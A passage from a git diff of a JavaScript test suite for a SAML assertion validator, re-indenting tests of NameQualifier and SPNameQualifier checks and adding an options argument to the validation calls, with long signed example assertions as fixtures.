JguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\" SPNameQualifier=\"other-qualifier\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-08-02T22:09:48.654Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-08-02T21:59:48.654Z\" NotOnOrAfter=\"2016-08-02T22:09:48.654Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-08-02T21:59:48.654Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n-\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-      checkExpiration: false,\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        if (err) return done(err);\n \n-        assert.ok(profile);\n-        assert.equal(\n-          \"foo\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n-          ]\n-        );\n-        assert.equal(\n-          \"Foo Bar\",\n-          profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n-        );\n-        assert.equal(\n-          \"foo@bar.com\",\n-          profile[\n-            \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n-          ]\n+    it('should ignore the SPNameQualifier validation when the nameid format is \"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\"', function (done) {\n+        const signedAssertion =\n+            '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_nPmKm9IskDCo61hUea4DX7o3POLbLcUK\" IssueInstant=\"2016-08-02T21:59:48.654Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_nPmKm9IskDCo61hUea4DX7o3POLbLcUK\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>UYsy9NacnRqnSTbidM8WBBgS+Op0G05iBJTX0T1WlUk=</DigestValue></Reference></SignedInfo><SignatureValue>VzRQaMR5Qk1P+g1tqJRKroq4JJx00FZ0rZxO4vG2gGkBXJ8262B4VUHOkxyPHNH1l/DuxSnNsL8AAbZfn8EdxMdToPvm2hkqygyA5W20o6g6eSC41rDOavTzesOKoXn3Uq9DOiUXve5ieYYCt5bQcoSCVT6uhVEKMhdcLhaB507qj9Gzcfp0E4F57ezRTTnVVEF/wCJ5j0QTMA2Wh09fxNkGijlE8KHzDJZapN4tDCzmK8qY7211gKuTfKYJGXYA4hSxw9fiQGDEPKRYA6tWf0HO5Vd8edRg2ZHr7AgjuCPp5Fj8VOP+KppA1YFBbq4Eqqt6KHg91KJlGs3ivpmwPw==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:unspecified\" SPNameQualifier=\"other-qualifier\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-08-02T22:09:48.654Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-08-02T21:59:48.654Z\" NotOnOrAfter=\"2016-08-02T22:09:48.654Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-08-02T21:59:48.654Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n+\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+            checkExpiration: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                if (err) return done(err);\n+\n+                assert.ok(profile);\n+                assert.equal(\n+                    \"foo\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/nameidentifier\"\n+                        ]\n+                );\n+                assert.equal(\n+                    \"Foo Bar\",\n+                    profile[\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"]\n+                );\n+                assert.equal(\n+                    \"foo@bar.com\",\n+                    profile[\n+                        \"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"\n+                        ]\n+                );\n+                assert.equal(\"foo@bar.com\", profile[\"email\"]);\n+                assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n+                done();\n+            }\n         );\n-        assert.equal(\"foo@bar.com\", profile[\"email\"]);\n-        assert.equal(\"urn:issuer\", profile[\"issuer\"]);\n-        done();\n-      }\n-    );\n-  });\n-\n-  it('should validate the NameQualifier when nameid format is \"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\"', function (done) {\n-    const signedAssertion =\n-      '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_dZZwXmRpwYcaIdFA5l0qSCCuu0if9UNo\" IssueInstant=\"2016-09-29T12:34:13.488Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_dZZwXmRpwYcaIdFA5l0qSCCuu0if9UNo\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>ndqj65JwACeDERG2aZF6k0IF85KshkhgILzxhbKRyiw=</DigestValue></Reference></SignedInfo><SignatureValue>LPcIU9W9HmX1QM+baMPLTj9StBFRksnDoFn/HVd8uLJgdH8Xeiv9TOQGElmSaBLypjCeN6ILq6pcZ0mxMC9zfd9X3WKmYtcrGI1BugATeNsqUm63x+Msau8pNuZrNNbfIQvLooMhF4T92ym2ADSm+zCQVNwBH7/v0rVIE6MEy8AYqqfpvH9CR88XQYMCSgKN0JQ2FPbcHvhIX7Hl+xG6PSzgfznE8dcWBUi24FajyGpqlNm8O3uHCfjR3wzO42UQIJFOJOiLb7QGNyWE1KXKYWyzZgAxGQuRUcbYxcnKTbVK3b3TBH+p2ZR+a2ktKmvqNBvQxy6tE4UXDIIpvmknSw==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" NameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:44:13.488Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:34:13.488Z\" NotOnOrAfter=\"2016-09-29T12:44:13.488Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:34:13.488Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n-\n-    const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n-    const samlPassport = new SamlPassport({\n-      cert: publicKey,\n-      realm: \"urn:myapp\",\n-      checkRecipient: false,\n-      checkExpiration: false,\n     });\n-    samlPassport.validateSamlAssertion(\n-      signedAssertion,\n-      function (err, profile) {\n-        assert.equal(\n-          err.message,\n-          \"NameQualifier attribute in the NameID element does not match urn:issuer\"\n+\n+    it('should validate the NameQualifier when nameid format is \"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\"', function (done) {\n+        const signedAssertion =\n+            '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_dZZwXmRpwYcaIdFA5l0qSCCuu0if9UNo\" IssueInstant=\"2016-09-29T12:34:13.488Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_dZZwXmRpwYcaIdFA5l0qSCCuu0if9UNo\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>ndqj65JwACeDERG2aZF6k0IF85KshkhgILzxhbKRyiw=</DigestValue></Reference></SignedInfo><SignatureValue>LPcIU9W9HmX1QM+baMPLTj9StBFRksnDoFn/HVd8uLJgdH8Xeiv9TOQGElmSaBLypjCeN6ILq6pcZ0mxMC9zfd9X3WKmYtcrGI1BugATeNsqUm63x+Msau8pNuZrNNbfIQvLooMhF4T92ym2ADSm+zCQVNwBH7/v0rVIE6MEy8AYqqfpvH9CR88XQYMCSgKN0JQ2FPbcHvhIX7Hl+xG6PSzgfznE8dcWBUi24FajyGpqlNm8O3uHCfjR3wzO42UQIJFOJOiLb7QGNyWE1KXKYWyzZgAxGQuRUcbYxcnKTbVK3b3TBH+p2ZR+a2ktKmvqNBvQxy6tE4UXDIIpvmknSw==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" NameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:44:13.488Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:34:13.488Z\" NotOnOrAfter=\"2016-09-29T12:44:13.488Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue xsi:type=\"xs:anyType\">foo@bar.com</saml:AttributeValue></saml:Attribute><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/name\"><saml:AttributeValue xsi:type=\"xs:anyType\">Foo Bar</saml:AttributeValue></saml:Attribute></saml:AttributeStatement><saml:AuthnStatement AuthnInstant=\"2016-09-29T12:34:13.488Z\"><saml:AuthnContext><saml:AuthnContextClassRef>urn:oasis:names:tc:SAML:2.0:ac:classes:unspecified</saml:AuthnContextClassRef></saml:AuthnContext></saml:AuthnStatement></saml:Assertion>';\n+\n+        const publicKey = fs.readFileSync(__dirname + \"/test-auth0.cer\").toString();\n+        const samlPassport = new SamlPassport({\n+            cert: publicKey,\n+            realm: \"urn:myapp\",\n+            checkRecipient: false,\n+            checkExpiration: false,\n+        });\n+        samlPassport.validateSamlAssertion(\n+            signedAssertion, {},\n+            function (err, profile) {\n+                assert.equal(\n+                    err.message,\n+                    \"NameQualifier attribute in the NameID element does not match urn:issuer\"\n+                );\n+                done();\n+            }\n         );\n-        done();\n-      }\n-    );\n-  });\n-\n-  it('should validate the SPNameQualifier when the nameid format is \"urn:oasis:names:tc:SAML:2.0:nameid-format:transient\"', function (done) {\n-    const signedAssertion =\n-      '<saml:Assertion xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\" Version=\"2.0\" ID=\"_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\" IssueInstant=\"2016-09-29T12:35:22.345Z\"><saml:Issuer>urn:issuer</saml:Issuer><Signature xmlns=\"http://www.w3.org/2000/09/xmldsig#\"><SignedInfo><CanonicalizationMethod Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/><SignatureMethod Algorithm=\"http://www.w3.org/2001/04/xmldsig-more#rsa-sha256\"/><Reference URI=\"#_muhd3ZBmN9LK3Ev08rkc8CA40YvNOkGl\"><Transforms><Transform Algorithm=\"http://www.w3.org/2000/09/xmldsig#enveloped-signature\"/><Transform Algorithm=\"http://www.w3.org/2001/10/xml-exc-c14n#\"/></Transforms><DigestMethod Algorithm=\"http://www.w3.org/2001/04/xmlenc#sha256\"/><DigestValue>Gsh2DubHXYDeuHyBa+DU1k5G43UjyQsyPRYVgEqpTD8=</DigestValue></Reference></SignedInfo><SignatureValue>mubsqLCaM16gT2rAFLl8XDuLWTALH6cdRMM/kNHLpVzO5PA6FGVPX5ojW2UCKGOhGHn0Hd/mYCOCtgAROphWjxpQl5TDyeQE0frjKs8ik0V/Jjy5T6PeWKHLqN6sHbP6YpkGixshCWtop8JOs6SijM9PBGnWal6Nx5bUMBfAyUnGyIhLwNaE8Z4NHkyAqmdxgLS0e8w5qngKQaUlyERZCrqKQ4w8VaHFG4Dos36XVfh+U7udo3IlbrpBLsu9xG1Azxe2iPC6+84xC09P6EvQylvTnz5NU4jhk10SmmRjZ6AVvzJTz/gbVfRfZoEAUhCuIIh3HuRwf400ESf38ouZTA==</SignatureValue><KeyInfo><X509Data><X509Certificate>MIIEDzCCAvegAwIBAgIJALr9HwgrQ7GeMA0GCSqGSIb3DQEBBQUAMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDAeFw0xMjEyMjkxNTMwNDdaFw0xMzAxMjgxNTMwNDdaMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZDCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAMZiVmNHiXLldrgbS50ONNOH7pJ2zg6OcSMkYZGDZJbOZ/TqwauC6JOnI7+xtkPJsQHZSFJs4U0srjZKzDCmaz2jLAJDShP2jaXlrki16nDLPE//IGAg3BJguSmBCWpDbSm92V9hSsE+Mhx6bDaJiw8yQ+Q8iSm0aTQZtp6O4ICMu00ESdh9NJqIECELvP31ADV1Xhj7IbyyVPDFxMv3ol5BySE9wwwOFUq/wv7Xz9LRiUjUzPO+Lq3OM3o/uCDbk7jD7XrGUuOydALD8ULsXp4EuDO+nFbeXB/iKndZynuVKokirywl2nD2IP0/yncdLQZ8ByIyqP3G82fq/l8p7AsCAwEAAaOBxzCBxDAdBgNVHQ4EFgQUHI2rUXeBjTv1zAllaPGrHFcEK0YwgZQGA1UdIwSBjDCBiYAUHI2rUXeBjTv1zAllaPGrHFcEK0ahZqRkMGIxGDAWBgNVBAMTD2F1dGgwLmF1dGgwLmNvbTESMBAGA1UEChMJQXV0aDAgTExDMQswCQYDVQQGEwJVUzETMBEGA1UECBMKV2FzaGluZ3RvbjEQMA4GA1UEBxMHUmVkbW9uZIIJALr9HwgrQ7GeMAwGA1UdEwQFMAMBAf8wDQYJKoZIhvcNAQEFBQADggEBAFrXIhCy4T4eGrikb0R2wHv/uS548r3pZyBV0CDbcRwAtbnpJMvkGFqKVp4pmyoIDSVNK/j+sLEshB20XftezHZyRJbCUbtKvXQ6FsxoeZMlN0ITYKTaoBZKhUxxj90otAhNC58qwGUPqt2LewJhHyLucKkGJ1mQ3b5xKZ532ToufouH9VLhig3H1KnxWo/zMD6Ke8cCk6qO9htuhI06s3GQGS1QWQtAmm17C6TfKgDwQFZwhqHUUZnwKRH8gU6OgZsvhgV1B7H5mjZcu57KMiDBekU9MEY0DCVTN3WkmcTII668zLsJrkNX6PEfck1AMBbVE6pEUKcWwq3uaLvlAUo=</X509Certificate></X509Data></KeyInfo></Signature><saml:Subject><saml:NameID Format=\"urn:oasis:names:tc:SAML:2.0:nameid-format:persistent\" SPNameQualifier=\"invalid-value\">foo</saml:NameID><saml:SubjectConfirmation Method=\"urn:oasis:names:tc:SAML:2.0:cm:bearer\"><saml:SubjectConfirmationData NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"/></saml:SubjectConfirmation></saml:Subject><saml:Conditions NotBefore=\"2016-09-29T12:35:22.345Z\" NotOnOrAfter=\"2016-09-29T12:45:22.345Z\"><saml:AudienceRestriction><saml:Audience>urn:myapp</saml:Audience></saml:AudienceRestriction></saml:Conditions><saml:AttributeStatement xmlns:xs=\"http://www.w3.org/2001/XMLSchema\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\"><saml:Attribute Name=\"http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress\"><saml:AttributeValue 